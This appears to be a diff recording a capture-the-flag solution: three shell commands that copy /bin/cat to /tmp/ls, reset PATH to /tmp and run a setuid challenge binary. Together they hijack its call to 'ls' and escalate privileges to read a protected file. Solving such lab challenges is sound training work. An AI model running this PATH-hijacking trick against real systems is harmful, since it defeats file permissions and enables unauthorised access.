@@ -1,0 +1,3 @@
+app-script-ch11@challenge02:~$ cp /bin/cat /tmp/ls
+app-script-ch11@challenge02:~$ export PATH=/tmp
+app-script-ch11@challenge02:~$ ./ch11
